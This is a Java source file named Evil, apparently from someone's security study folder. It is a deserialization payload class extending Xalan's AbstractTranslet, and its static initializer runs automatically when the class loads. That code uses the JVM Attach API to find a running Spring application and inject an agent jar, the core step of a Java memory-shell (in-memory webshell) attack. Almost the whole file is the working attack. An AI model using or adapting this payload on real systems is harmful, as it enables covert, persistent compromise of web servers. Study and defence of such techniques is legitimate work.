package AgentMemShell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet {
    static {
        try {
            String path = "R:\\languages\\Java\\study\\Agent_Tech\\agentmain\\src\\main\\java\\AgentMemShell\\jars\\agentmain.jar";
            String springApplication = "com.example.springdemo.SpringDemoApplication";

            java.net.URL url = new java.io.File(path).toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
//            ClassLoader classLoader = ClassLoader.getSystemClassLoader();

            Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list", null);
            java.util.List list = (java.util.List) listMethod.invoke(MyVirtualMachine, null);
            System.out.println("Running JVM list ...");
            for (int i = 0; i < list.size(); i++) {
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName", null);
                String name = (String) displayName.invoke(o, null);
                // 这里的 if 条件根据实际情况进行更改,不加也行，附加在全部的程序上
                if (name.contains(springApplication)) {
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id", null);
                    String id = (String) getId.invoke(o, null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach", new Class[]{String.class});
                    Object vm = attach.invoke(o, new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent", new Class[]{String.class});
                    loadAgent.invoke(vm, new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach", null);
                    detach.invoke(vm, null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
